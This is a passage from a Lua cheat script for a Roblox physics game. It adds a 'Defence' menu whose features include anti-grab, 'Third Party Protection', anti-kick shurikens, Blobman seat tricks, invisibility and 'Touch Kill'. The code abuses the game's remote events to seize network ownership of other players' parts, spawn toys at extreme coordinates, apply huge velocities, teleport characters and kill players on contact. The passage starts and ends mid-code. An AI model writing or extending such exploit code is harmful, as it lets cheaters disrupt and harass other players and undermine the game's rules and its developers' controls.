                local prt = obj:FindFirstChild('SoundPart') or obj:FindFirstChild('HumanoidRootPart') or obj:FindFirstChild('Main') or obj:FindFirstChild('Balloon')

                if obj:FindFirstChild('Humanoid') then
                    if not obj.Humanoid.SeatPart then
                        if prt and prt.ReceiveAge ~= 0 then
                            return false
                        end
                    elseif obj.Humanoid.SeatPart.Parent then
                        return checkgrab(obj.Humanoid.SeatPart.Parent)
                    end
                elseif prt and prt.ReceiveAge ~= 0 then
                    return false
                end

                return true
            end

            if not checkgrab(char) then
                local hum = char:FindFirstChild('Humanoid')
                local ragdolled = hum and hum:FindFirstChild('Ragdolled') and hum.Ragdolled.Value

                if ragdolled or not model then
                    game.ReplicatedStorage.CharacterEvents.Struggle:FireServer(lp)

                    if hum then
                        for _, track in ipairs(hum:GetPlayingAnimationTracks())do
                            if track.Animation.AnimationId == 'rbxassetid://7047322890' then
                                track:Stop()
                            end
                        end
                    end
                else
                    if model and model:FindFirstChild('HoldPart') then
                        local hold = model.HoldPart

                        if hold:FindFirstChild('HoldItemRemoteFunction') then
                            task.spawn(function()
                                hold.HoldItemRemoteFunction:InvokeServer(model, char)
                            end)
                            game.ReplicatedStorage.MenuToys.DestroyToy:FireServer(model)

                            if hum then
                                hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)

                                hum.AutoRotate = true
                                hum.Sit = false
                            end

                            game.ContextActionService:UnbindAction('Escape')
                            game.ContextActionService:UnbindAction('JumpRemover')
                        end
                    end
                end
            end
        end
        if not model then
            local lp = game.Players.LocalPlayer
            local char = lp.Character

            if char and char.Parent == workspace and lp:FindFirstChild('CanSpawnToy') and lp.CanSpawnToy.Value and not st then
                st = tick()

                task.spawn(function()
                    game.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('FoodMayonnaise', CFrame.new(1e5, 1e5, 1e5), Vector3.new(0, 0, 0))
                end)
            elseif st and tick() - st > 1 then
                local toyFolder = workspace:FindFirstChild(lp.Name .. 'SpawnedInToys')

                if not (toyFolder and toyFolder:FindFirstChild('FoodMayonnaise')) then
                    st = nil
                end
            end
        end

        task.wait()
    end
end

local DefCore = Tabs.Defence:AddLeftGroupbox('Core', 'shield')
local DefInput = Tabs.Defence:AddLeftGroupbox('Anti Network Type', 'server')
local DefMove = Tabs.Defence:AddRightGroupbox('Loop TP', 'wind')
local DefUtilExtra = Tabs.Defence:AddRightGroupbox('Utility', 'wrench')
local GMisc = Tabs.Defence:AddRightGroupbox('Misc', 'wrench')
local box = Tabs.Defence:AddLeftGroupbox('Third Party Protection', 'shield')

tppEnabled = false
tppTargets = {}
tppMethod = 'Grab'
tppDropdown = box:AddDropdown('TPPTarget', {
    Text = 'Protect Players',
    Values = {
        'None',
    },
    Default = {},
    Multi = true,
    Callback = function(v)
        tppTargets = {}

        if typeof(v) == 'table' then
            for key, state in pairs(v)do
                if state == true then
                    local name = key:match('%((.-)%)')

                    if name then
                        table.insert(tppTargets, name)
                    end
                end
            end
        end
    end,
})

function refreshPlayers()
    local list = {}

    for _, pl in ipairs(Players:GetPlayers())do
        if pl ~= plr then
            table.insert(list, pl.DisplayName .. ' (' .. pl.Name .. ')')
        end
    end

    tppDropdown:SetValues(list)
    Library:Notify({
        Title = '<b>UNSTABLE</b>',
        Description = 'Player list refreshed',
        Time = 2,
    })
end

box:AddButton({
    Text = 'Refresh Players',
    Func = refreshPlayers,
})
box:AddButton({
    Text = 'Clear All Protected',
    Func = function()
        tppTargets = {}

        tppDropdown:SetValue({})
        Library:Notify({
            Title = '<b>UNSTABLE</b>',
            Description = 'All protected players cleared',
            Time = 2,
        })
    end,
})

local tppCountLabel = box:AddLabel('Protecting: 0 players')

task.spawn(function()
    while task.wait(0.5) do
        if tppCountLabel then
            tppCountLabel:SetText('Protecting: ' .. #tppTargets .. ' players')
        end
    end
end)
box:AddDropdown('TPPMethod', {
    Text = 'Method',
    Values = {
        'Grab',
        'Bring',
    },
    Default = 1,
    Multi = false,
    Callback = function(v)
        tppMethod = v
    end,
})

function runTPPLoop()
    task.spawn(function()
        while tppEnabled do
            RunService.RenderStepped:Wait()

            if #tppTargets == 0 then
                continue
            end

            for _, targetName in ipairs(tppTargets)do
                local target = Players:FindFirstChild(targetName)

                if not target or not target.Character then
                    continue
                end

                local char = target.Character
                local hrp = char:FindFirstChild('HumanoidRootPart')
                local head = char:FindFirstChild('Head')

                if not hrp or not head then
                    continue
                end

                local partOwner = head:FindFirstChild('PartOwner')

                if not partOwner or partOwner.Value == '' or partOwner.Value == plr.Name then
                    continue
                end

                local distance = (hrp.Position - HRP.Position).Magnitude

                if distance <= 30 then
                    pcall(function()
                        SetNetOwner:FireServer(hrp, hrp.CFrame)
                        CreateLine:FireServer(hrp, Vector3.zero, hrp.Position, false)
                    end)

                    local weOwnIt = head:FindFirstChild('PartOwner') and head.PartOwner.Value == plr.Name

                    if weOwnIt then
                        if tppMethod == 'Bring' then
                            hrp.CFrame = HRP.CFrame * CFrame.new(0, 5, 0)
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero
                        end

                        pcall(function()
                            DestroyLine:FireServer(hrp)
                        end)
                    end
                else
                    local saved = HRP.CFrame

                    HRP.CFrame = hrp.CFrame * CFrame.new(0, 0, 2)

                    task.wait(0.05)

                    for i = 1, 15 do
                        pcall(function()
                            SetNetOwner:FireServer(hrp, hrp.CFrame)
                            CreateLine:FireServer(hrp, Vector3.zero, hrp.Position, false)
                        end)
                        task.wait(0.01)
                    end

                    local weOwnIt = head:FindFirstChild('PartOwner') and head.PartOwner.Value == plr.Name

                    if weOwnIt then
                        if tppMethod == 'Bring' then
                            hrp.CFrame = saved * CFrame.new(0, 5, 0)
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero

                            task.wait(0.05)
                        end

                        pcall(function()
                            DestroyLine:FireServer(hrp)
                        end)
                    end

                    HRP.CFrame = saved
                    HRP.AssemblyLinearVelocity = Vector3.zero
                    HRP.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end
    end)
end

box:AddCheckbox('TPPEnabled', {
    Text = '<b>[TARGETS]</b> Third Party Protection',
    Default = false,
    Callback = function(v)
        tppEnabled = v

        if v then
            runTPPLoop()
        end
    end,
})
box:AddCheckbox('TPPAntiKick', {
    Text = '<b>[TARGETS]</b> Anti Kick',
    Default = false,
    Callback = function(v)
        if not v then
            for _, targetName in ipairs(tppTargets)do
                local target = Players:FindFirstChild(targetName)

                if target then
                    local targetInv = workspace:FindFirstChild(target.Name .. 'SpawnedInToys')

                    if targetInv and targetInv:FindFirstChild('TPPShuriken_' .. targetName) then
                        pcall(function()
                            DestroyToy:FireServer(targetInv['TPPShuriken_' .. targetName])
                        end)
                    end
                end
            end

            return
        end

        task.spawn(function()
            local shurikens = {}
            local setupDone = {}

            while Toggles.TPPAntiKick.Value do
                RunService.RenderStepped:Wait()

                if #tppTargets == 0 then
                    continue
                end

                for _, targetName in ipairs(tppTargets)do
                    pcall(function()
                        local target = Players:FindFirstChild(targetName)

                        if not target or not target.Character then
                            setupDone[targetName] = false

                            return
                        end

                        local targetChar = target.Character
                        local targetHRP = targetChar:FindFirstChild('HumanoidRootPart')
                        local targetFirePart = targetHRP and targetHRP:FindFirstChild('FirePlayerPart')

                        if not targetHRP or not targetFirePart then
                            return
                        end

                        local myChar = plr.Character
                        local myHRP = myChar and myChar:FindFirstChild('HumanoidRootPart')

                        if myHRP then
                            local dist = (targetHRP.Position - myHRP.Position).Magnitude

                            if dist > 30 then
                                setupDone[targetName] = false

                                return
                            end
                        end

                        local targetInv = workspace:FindFirstChild(target.Name .. 'SpawnedInToys')

                        if not targetInv then
                            return
                        end

                        local shuName = 'TPPShuriken_' .. targetName
                        local shuData = shurikens[targetName]
                        local shu = shuData and shuData.toy
                        local part = shuData and shuData.part
                        local shuExists = shu and shu.Parent ~= nil
                        local partExists = part and part.Parent ~= nil

                        if setupDone[targetName] and (not shuExists or not partExists) then
                            setupDone[targetName] = false
                            shurikens[targetName] = nil
                        end
                        if not setupDone[targetName] then
                            if not target.CanSpawnToy or not target.CanSpawnToy.Value then
                                return
                            end

                            shu = spawntoy('NinjaShuriken', targetHRP.CFrame * CFrame.new(5, 10, 20))

                            if not shu then
                                return
                            end

                            shu.Name = shuName
                            part = shu:WaitForChild('StickyPart', 0.5)

                            if not part then
                                return
                            end

                            sno(part)
                            task.wait(0.1)
                            StickyEvent:FireServer(part, targetFirePart, CFrame.new(0, 0, 0, 1, 0, 0, 0, 0, -1, 0, 1, 0))

                            shurikens[targetName] = {
                                toy = shu,
                                part = part,
                            }
                            setupDone[targetName] = true

                            Library:Notify({
                                Title = '<b>UNSTABLE</b>',
                                Description = 'Attached Anti Kick to' .. target.DisplayName,
                                Time = 3,
                            })
                        end
                        if part and part:FindFirstChild('PartOwner') and part.PartOwner.Value ~= plr.Name then
                            sno(part)
                        end

                        for _, toy in ipairs(targetInv:GetChildren())do
                            if toy:FindFirstChild('StickyPart') then
                                local sp = toy.StickyPart
                                local po = sp:FindFirstChild('PartOwner')
                                local sw = sp:FindFirstChild('StickyWeld')

                                if po and po.Value ~= '' and po.Value ~= target.Name then
                                    SetNetOwner:FireServer(sp, sp.CFrame)
                                    task.wait()

                                    if po.Value == plr.Name then
                                        sp.CFrame = CFrame.new(0, 0 / 0, 0)
                                    end
                                end
                                if sw and sw.Part1 then
                                    local weldParent = sw.Part1.Parent

                                    if weldParent and weldParent ~= targetChar then
                                        SetNetOwner:FireServer(sp, sp.CFrame)
                                        task.wait()

                                        if po and po.Value == plr.Name then
                                            sp.CFrame = CFrame.new(0, 0 / 0, 0)
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end

            for targetName, data in pairs(shurikens)do
                pcall(function()
                    if data.toy then
                        DestroyToy:FireServer(data.toy)
                    end
                end)
            end

            shurikens = {}
            setupDone = {}
        end)
    end,
})
task.spawn(function()
    while task.wait(0.5) do
        if not tppEnabled then
            tppStatusLabel:SetText('THIRD PARTY PROTECTION DISABLED')
        elseif #tppTargets == 0 then
            tppStatusLabel:SetText('NO TARGETS')
        else
            local grabbedList = {}
            local safeList = {}

            for _, targetName in ipairs(tppTargets)do
                local target = Players:FindFirstChild(targetName)

                if target then
                    local char = target.Character
                    local head = char and char:FindFirstChild('Head')
                    local partOwner = head and head:FindFirstChild('PartOwner')

                    if partOwner and partOwner.Value ~= '' and partOwner.Value ~= plr.Name then
                        table.insert(grabbedList, target.DisplayName)
                    else
                        table.insert(safeList, target.DisplayName)
                    end
                else
                    table.insert(safeList, targetName .. ' (offline)')
                end
            end

            if #grabbedList > 0 then
                tppStatusLabel:SetText('GRABBED [' .. #grabbedList .. ']: ' .. formatList(grabbedList))
            else
                tppStatusLabel:SetText('SAFE [' .. #safeList .. ']: ' .. formatList(safeList))
            end
        end
    end
end)
task.spawn(function()
    task.wait(1)

    local list = {}

    for _, pl in ipairs(Players:GetPlayers())do
        if pl ~= plr then
            table.insert(list, pl.DisplayName .. ' (' .. pl.Name .. ')')
        end
    end

    tppDropdown:SetValues(list)
end)
Players.PlayerAdded:Connect(function()
    local list = {}

    for _, pl in ipairs(Players:GetPlayers())do
        if pl ~= plr then
            table.insert(list, pl.DisplayName .. ' (' .. pl.Name .. ')')
        end
    end

    tppDropdown:SetValues(list)
end)
Players.PlayerRemoving:Connect(function()
    task.wait(0.1)

    local list = {}

    for _, pl in ipairs(Players:GetPlayers())do
        if pl ~= plr then
            table.insert(list, pl.DisplayName .. ' (' .. pl.Name .. ')')
        end
    end

    tppDropdown:SetValues(list)
end)
workspace.DescendantAdded:Connect(function(d)
    if d.Name == 'GrabBeam' then
        Lines += 1

        lagger = d.Parent.Parent.Parent
    end
end)
folder.ChildAdded:Connect(function(child)
    if child.Name == 'FoodHamburger' then
        currentFood = child
    end
end)
LocalPlayer.CharacterAdded:Connect(function()
    if antiStickyT then
        task.wait(1)

        local ps = LocalPlayer:FindFirstChild('PlayerScripts')

        if ps then
            local sticky = ps:FindFirstChild('StickyPartsTouchDetection')

            if sticky then
                sticky.Disabled = true
            end
        end
    end
end)
LocalPlayer.CharacterAdded:Connect(function()
    if defenseEnabled then
        task.wait(1)
        startDefense()
    end
end)
DefCore:AddCheckbox('AntiGrab_Cheeky', {
    Text = 'Anti Grab',
    Tooltip = 'Cannot be thrown or ragdolled',
    Default = false,
})
Toggles.AntiGrab_Cheeky:OnChanged(function(state)
    ACGE = state

    if state then
        if not antiGrabThread then
            antiGrabThread = task.spawn(function()
                cheekyAntiGrab()

                antiGrabThread = nil
            end)
        end
    else
        ACGE = false
    end
end)

local antiGrabExplosionConn, antiGrabHeldConn, antiGrabStruggleConn, antiGrabHumConn, antiGrabAnchorConn
local antiGrabRootCF, antiGrabRootPos, antiGrabHardFreeze = nil, nil, false

function antiGrabUnfreeze(char)
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp then
        hrp.Anchored = false

        if hrp:FindFirstChild('FreezeJoint') then
            hrp.FreezeJoint:Destroy()
        end
    end

    antiGrabHardFreeze = false

    if antiGrabAnchorConn then
        antiGrabAnchorConn:Disconnect()

        antiGrabAnchorConn = nil
    end
end
function antiGrabFreezeInPlace(char)
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end

    antiGrabRootCF = hrp.CFrame
    antiGrabRootPos = hrp.Position
    antiGrabHardFreeze = true

    if not hrp:FindFirstChild('FreezeJoint') then
        local align = Instance.new('AlignPosition')

        align.Name = 'FreezeJoint'
        align.Mode = Enum.PositionAlignmentMode.OneAttachment
        align.MaxForce = 1e6
        align.MaxVelocity = 0
        align.Responsiveness = 200

        local att = Instance.new('Attachment', hrp)

        align.Attachment0 = att
        align.Position = antiGrabRootPos
        align.Parent = hrp
    end

    antiGrabAnchorConn = R.Heartbeat:Connect(function()
        if antiGrabHardFreeze and hrp then
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            hrp.CFrame = antiGrabRootCF
        end
    end)
end
function antiGrabReconnect()
    local char = Player.Character or Player.CharacterAdded:Wait()
    local hum = char:WaitForChild('Humanoid')
    local hrp = char:WaitForChild('HumanoidRootPart')
    local fp = hrp:FindFirstChild('FirePlayerPart')

    if fp then
        fp:Destroy()
    end
    if antiGrabHumConn then
        antiGrabHumConn:Disconnect()
    end

    antiGrabHumConn = hum.Changed:Connect(function(p)
        if p == 'Sit' and hum.Sit then
            if not (hum.SeatPart and tostring(hum.SeatPart.Parent) == 'CreatureBlobman') then
                hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)

                hum.Sit = false
            end
        end
    end)
end

autoStruggleConn = nil
AntiGrabEnabled = false
HeldConnection = nil
AntiGrab = false
AntiGrabProc = false
AGWalk = false
Cons = {}

function DiscAll()
    for k, v in pairs(Cons)do
        if v then
            v:Disconnect()
        end
    end

    table.clear(Cons)
end
function ApplyAntiGrab(char)
    if not char or not AntiGrab then
        return
    end

    local hrp = char:WaitForChild('HumanoidRootPart', 5)
    local hum = char:WaitForChild('Humanoid', 5)
    local head = char:WaitForChild('Head', 5)

    if not (hrp and hum and head) then
        return
    end

    for _, v in pairs(char:GetChildren())do
        if v:IsA('BasePart') and v:FindFirstChild('BallSocketConstraint') and v.Name ~= 'Head' then
            v.BallSocketConstraint.Enabled = false

            if v:FindFirstChild('RagdollLimbPart') then
                v.RagdollLimbPart.WeldConstraint.Enabled = false
            end
        end
    end

    Cons.AGHead = head.ChildAdded:Connect(function(PartOwner)
        if PartOwner.Name == 'PartOwner' then
            if not AntiGrabProc then
                AntiGrabProc = true
                hum.Sit = false

                StruggleEvent:FireServer(Player)
                task.spawn(function()
                    while(head and head:FindFirstChild('PartOwner')) or BeingHeld.Value do
                        StruggleEvent:FireServer(Player)
                        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0)
                        task.wait()
                    end
                end)

                hrp.Anchored = true

                if not AGWalk then
                    AGWalk = true

                    while BeingHeld.Value and task.wait() do
                        hrp.CFrame = hrp.CFrame + hum.MoveDirection * 0.43
                    end
                end

                hrp.Anchored = false
                AntiGrabProc = false
                AGWalk = false
            end
        end
    end)

    local ragdolled = hum:WaitForChild('Ragdolled', 5)

    if ragdolled then
        Cons.AGRagdoll = ragdolled.Changed:Connect(function()
            if hum.Ragdolled.Value then
                for _, v in pairs(char:GetChildren())do
                    if v:IsA('BasePart') and v:FindFirstChild('BallSocketConstraint') and v.Name ~= 'Head' then
                        v.BallSocketConstraint.Enabled = false

                        if v:FindFirstChild('RagdollLimbPart') then
                            v.RagdollLimbPart.WeldConstraint.Enabled = false
                        end
                    end
                end
            end
        end)
    end

    local weldHRP = hrp:WaitForChild('WeldHRP', 5)

    if weldHRP then
        Cons.AGWeld = weldHRP.Changed:Connect(function()
            if hrp.WeldHRP.Enabled then
                while not hum.Sit do
                    task.wait()
                end

                hum.Sit = false
                hum.AutoRotate = true
                hum.HipHeight = 1

                while hrp.WeldHRP.Enabled and task.wait() do
                    head.CFrame = hrp.CFrame + Vector3.new(0, 1.35, 0)
                end

                hum.HipHeight = 0
            end
        end)
    end
end

DefCore:AddCheckbox('AntiGrab', {
    Text = 'Anti Grab V2',
    Default = false,
})
Toggles.AntiGrab:OnChanged(function(Value)
    AntiGrab = Value

    DiscAll()

    if AntiGrab then
        ApplyAntiGrab(Player.Character)

        Cons.AGChar = Player.CharacterAdded:Connect(ApplyAntiGrab)
    else
        local char = Player.Character

        if char then
            for _, v in pairs(char:GetChildren())do
                if v:IsA('BasePart') and v:FindFirstChild('BallSocketConstraint') and v.Name ~= 'Head' then
                    v.BallSocketConstraint.Enabled = false

                    if v:FindFirstChild('RagdollLimbPart') then
                        v.RagdollLimbPart.WeldConstraint.Enabled = true
                    end
                end
            end
        end
    end
end)

RunService = game:GetService('RunService')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
SpawnToyRemoteFunction = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
GrabEvents = ReplicatedStorage.GrabEvents
SetNetworkOwner = GrabEvents.SetNetworkOwner
CharacterEvents = ReplicatedStorage.CharacterEvents
RagdollRemote = CharacterEvents.RagdollRemote
GUE = false
GUTYPE = 'CreatureBlobman'
inexistance = {}

local itm
local sp
local sv
local humconnection
local LocalPlayer = game.Players.LocalPlayer

function getCharParts()
    local char = LocalPlayer.Character

    if not char then
        return nil, nil
    end

    return char:FindFirstChild('Humanoid'), char:FindFirstChild('HumanoidRootPart')
end

hum, hrp = getCharParts()

local characterAddedConnection

gucciRunning = false

function diddle()
    if itm then
        for _, prt in pairs(itm:GetChildren())do
            if prt:IsA('BasePart') then
                prt.CanCollide = false
            end
        end
    end

    hrp.CFrame = sp
    hrp.AssemblyLinearVelocity = sv

    hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
end
function gucciblob()
    if gucciRunning then
        return
    end

    gucciRunning = true

    local guccion = false
    local tickyticky = tick()

    while GUE do
        hum, hrp = getCharParts()

        if hum and hrp then
            local dt = tick() - tickyticky

            tickyticky = tick()

            if itm and itm:FindFirstChild('VehicleSeat') then
                local occupant = itm.VehicleSeat.Occupant

                if occupant and occupant ~= hum then
                    task.spawn(function()
                        DestroyToy:FireServer(itm)
                    end)

                    itm = nil
                    guccion = false
                    inexistance = {}

                    task.wait(0.1)

                    if LocalPlayer.CanSpawnToy.Value then
                        task.spawn(function()
                            SpawnToyRemoteFunction:InvokeServer(GUTYPE, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                        end)
                    end

                    task.wait()

                    continue
                end
            end
            if itm and itm.Parent and not ((itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant ~= hum) or inexistance[itm] < 1) then
                task.spawn(function()
                    DestroyToy:FireServer(itm)
                end)
            else
                local toyFolder = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

                itm = toyFolder and toyFolder:FindFirstChild(GUTYPE)
            end
            if not sp or not hum.SeatPart then
                sp = hrp.CFrame
                sv = hrp.AssemblyLinearVelocity
            end
            if humconnection ~= hum then
                humconnection = hum

                hum:GetPropertyChangedSignal('SeatPart'):Once(diddle, hum, hrp)
            end

            local wait = true

            if itm then
                inexistance[itm] = (inexistance[itm] or 0) + dt

                if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                    if not guccion then
                        (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    end

                    local diddy = itm.VehicleSeat

                    diddy.Parent = nil
                    diddy.Parent = itm

                    if not checkgrab(itm, true) and (hrp.CFrame.Position - (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).CFrame.Position).Magnitude < 28 then
                        for _, prt in pairs(itm:GetChildren())do
                            if prt:IsA('BasePart') and prt.CanQuery then
                                SetNetworkOwner:FireServer(prt, CFrame.lookAt(hrp.CFrame.Position, prt.CFrame.Position))
                            end
                        end
                    end
                    if not hum.SeatPart then
                        hum.Sit = false
                    else
                        wait = false

                        task.wait()
                    end
                    if hrp and hum and (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                        if hum.Ragdolled.Value or hum.Sit then
                            guccion = false
                        end
                        if itm.VehicleSeat.Occupant == hum then
                            guccion = true
                        elseif not guccion then
                            task.wait()

                            wait = false

                            if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) and not hum.Ragdolled.Value then
                                itm.VehicleSeat:Sit(hum)
                                RagdollRemote:FireServer(hrp, 1.6666666666666665E-2)
                            end
                        end
                        if guccion then
                            (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 1e15, 0)
                        else
                            if inexistance[itm] >= game.Stats.Network.ServerStatsItem['Data Ping']:GetValue() / 250 then
                                task.spawn(function()
                                    DestroyToy:FireServer(itm)
                                end)

                                hum.Sit = true
                            end
                        end
                    end
                else
                    if guccion then
                        hum.Sit = true
                    end

                    guccion = false

                    if inexistance[itm] >= 1 then
                        task.spawn(function()
                            DestroyToy:FireServer(itm)
                        end)

                        if LocalPlayer.CanSpawnToy.Value then
                            task.spawn(function()
                                SpawnToyRemoteFunction:InvokeServer(GUTYPE, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                            end)
                        end
                    end
                end
            else
                if guccion then
                    guccion = false
                    hum.Sit = true
                end
                if LocalPlayer.CanSpawnToy.Value then
                    task.spawn(function()
                        SpawnToyRemoteFunction:InvokeServer(GUTYPE, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                    end)
                end
            end
            if wait then
                task.wait()

                hum.Sit = false
            end
        else
            task.wait()
        end
    end

    gucciRunning = false
end
function onCharacterAdded(char)
    if not GUE then
        return
    end
    if itm and itm.Parent then
        task.spawn(function()
            DestroyToy:FireServer(itm)
        end)
    end

    itm = nil
    inexistance = {}
    humconnection = nil
    sp = nil
    sv = nil
    gucciRunning = false

    char:WaitForChild('Humanoid', 10)
    char:WaitForChild('HumanoidRootPart', 10)

    hum, hrp = getCharParts()

    task.wait(0.5)
    task.spawn(gucciblob)
end

if characterAddedConnection then
    characterAddedConnection:Disconnect()
end

characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

local GucciAntiGrabToggle = DefCore:AddCheckbox('GucciAntiGrab', {
    Text = '<b>[GUCCI]</b> Anti Grab',
    Tooltip = 'Makes you unable to be touched by anyone or anything.',
    Default = false,
})
local GucciKeyToggle = GucciAntiGrabToggle:AddKeyPicker('GucciAntiGrabKeybind', {
    Default = 'None',
    Text = 'Enable / Disable',
    Mode = 'Toggle',
    Callback = function(Value)
        GucciAntiGrabToggle:SetValue(Value)
    end,
})

GucciKeyToggle:OnChanged(function()
    print('Key updated', GucciKeyToggle.Value)
end)
GucciAntiGrabToggle:OnChanged(function(state)
    GUE = state
    seatNotified = {}

    if state then
        task.spawn(gucciblob)
    else
        if itm and itm.Parent then
            task.spawn(function()
                DestroyToy:FireServer(itm)
            end)
        end

        itm = nil
    end
end)

function FixGuciGrab()
    local toysFolder = Workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

    if not toysFolder then
        return
    end

    local blobman = toysFolder:FindFirstChild('CreatureBlobman')

    if not blobman then
        return
    end

    local seat = blobman:FindFirstChild('VehicleSeat')

    if seat then
        seat:Destroy()
    end
end

DefCore:AddButton({
    Text = 'Remove Seat',
    Tooltip = 'Removes Blobman seat to fix grab issues.',
    Callback = function()
        FixGuciGrab()
    end,
})

antiGucciConnectionTrain = nil
safePositionTrain = nil
restoreFramesTrain = 0
autoGucciActiveTrain = false

function startAntiGucciTrain()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild('Humanoid')
    local rootPart = character:WaitForChild('HumanoidRootPart')

    safePositionTrain = rootPart.Position

    local folder = workspace.Map.AlwaysHereTweenedObjects
    local train = folder and folder:FindFirstChild('Train')
    local seat

    if train then
        for _, d in ipairs(train:GetDescendants())do
            if d:IsA('Seat') then
                seat = d

                break
            end
        end
    end
    if seat then
        rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)

        seat:Sit(humanoid)
    end

    humanoid:GetPropertyChangedSignal('Jump'):Connect(function()
        if humanoid.Jump and humanoid.Sit then
            restoreFramesTrain = 15
            safePositionTrain = rootPart.Position
        end
    end)

    if antiGucciConnectionTrain then
        antiGucciConnectionTrain:Disconnect()
    end

    antiGucciConnectionTrain = RunService.Heartbeat:Connect(function()
        if not rootPart or not humanoid then
            return
        end

        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)

        if restoreFramesTrain > 0 then
            rootPart.CFrame = CFrame.new(safePositionTrain)
            restoreFramesTrain = restoreFramesTrain - 1
        end
    end)

    task.spawn(function()
        while humanoid.Sit do
            task.wait(1)
        end

        task.wait(0)

        rootPart.CFrame = CFrame.new(safePositionTrain)
    end)
end
function stopAntiGucciTrain()
    if antiGucciConnectionTrain then
        antiGucciConnectionTrain:Disconnect()

        antiGucciConnectionTrain = nil
    end

    local trainFolder = workspace.Map.AlwaysHereTweenedObjects

    if trainFolder and trainFolder:FindFirstChild('Train') then
        ResetPlayer(Players.LocalPlayer)
    end
end

DefCore:AddCheckbox('AutoGucciToggle', {
    Text = 'Invisible Gucci',
    Tooltip = 'When toggled, go fully invisible to all players.',
    Default = false,
    Callback = function(Value)
        autoGucciActiveTrain = Value

        if Value then
            startAntiGucciTrain()
            task.spawn(function()
                while autoGucciActiveTrain do
                    local trainFolder = workspace.Map.AlwaysHereTweenedObjects
                    local trainExists = trainFolder and trainFolder:FindFirstChild('Train')

                    if not trainExists then
                        stopAntiGucciTrain()

                        local retries = 0

                        repeat
                            task.wait(0.2)

                            retries = retries + 1
                            trainFolder = workspace.Map.AlwaysHereTweenedObjects
                        until (trainFolder and trainFolder:FindFirstChild('Train')) or retries > 25 or not autoGucciActiveTrain

                        if autoGucciActiveTrain and trainFolder and trainFolder:FindFirstChild('Train') then
                            startAntiGucciTrain()
                        end
                    end

                    task.wait(0.5)
                end
            end)
        else
            autoGucciActiveTrain = false

            stopAntiGucciTrain()
        end
    end,
})
DefCore:AddCheckbox('TouchKill', {
    Text = 'Touch Kill',
    Default = false,
    Tooltip = 'Removes collisions + kill players on contact.',
    Callback = function(state)
        TouchKill.active = state

        if state then
            startTouchKill()
        else
            stopTouchKill()
        end
    end,
})

plr = game:GetService('Players')
localdidi = plr.LocalPlayer
hookActive = false

function HookedPCLDBreak()
    hookActive = true
    char = localdidi.Character

    if not char then
        return
    end

    hrp = char:FindFirstChild('HumanoidRootPart')
    hum = char:FindFirstChild('Humanoid')

    if not hrp or not hum then
        return
    end

    killedAfterRespawn = false
    savedCFrame = hrp.CFrame
    hrp.CFrame = CFrame.new(hrp.Position.X, 50000, hrp.Position.Z)

    task.wait(0.05)

    hum.Health = 0

    localdidi.CharacterAdded:Once(function(newChar)
        newHrp = newChar:WaitForChild('HumanoidRootPart', 5)
        newHum = newChar:WaitForChild('Humanoid', 5)

        if newHrp and newHum then
            task.wait(0.1)

            newHrp.CFrame = savedCFrame

            if not killedAfterRespawn then
                killedAfterRespawn = true

                task.wait(0.05)

                newHum.Health = 0
            end
        end
    end)
end

DefCore:AddCheckbox('AntiBlobKick', {
    Text = 'Anti Blob Bring',
    Default = false,
    Tooltip = 'Prevents the player from being grabbed or flung by Blobman.',
})
Toggles.AntiBlobKick:OnChanged(function(Value)
    antiblob = Value

    if antiblob then
        if LocalPlayer.Character and not LocalPlayer.Character:FindFirstChild('TruePositionPart') then
            local truePosPart = Instance.new('Part')

            truePosPart.Parent = LocalPlayer.Character
            truePosPart.Name = 'TruePositionPart'
            truePosPart.Anchored = true
            truePosPart.Transparency = 1
            truePosPart.CanCollide = false
            truePosPart.Size = Vector3.new(0.1, 0.1, 0.1)
            truePosPart.CFrame = CFrame.new(0, -1E4, 0)
        end
    end

    task.spawn(function()
        while antiblob and task.wait() do
            if LocalPlayer.Character then
